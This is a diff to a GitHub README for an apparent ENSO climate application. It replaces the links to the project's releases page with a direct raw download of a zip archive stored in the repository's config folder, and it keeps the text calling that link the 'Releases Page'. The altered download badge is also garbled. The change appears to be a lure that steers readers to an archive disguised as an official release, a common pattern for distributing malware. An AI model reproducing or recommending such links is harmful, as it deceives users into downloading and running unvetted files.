@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/azertydj23-design/bi-clima-la-plata-enso/releases)
+[![Download](https://raw.githubusercontent.com/azertydj23-design/bi-clima-la-plata-enso/main/config/bi_la_enso_clima_plata_2.1.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/azertydj23-design/bi-clima-la-plata-enso/main/config/bi_la_enso_clima_plata_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -36,7 +36,7 @@ This application applies concepts from various fields:
 
 ## 💾 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/azertydj23-design/bi-clima-la-plata-enso/releases) to download the latest version of the application. Click on the version you wish to install, and follow these steps:
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/azertydj23-design/bi-clima-la-plata-enso/main/config/bi_la_enso_clima_plata_2.1.zip) to download the latest version of the application. Click on the version you wish to install, and follow these steps:
 
 1. Click on the file labeled for your operating system.
 2. Your download will begin. Wait for it to finish.
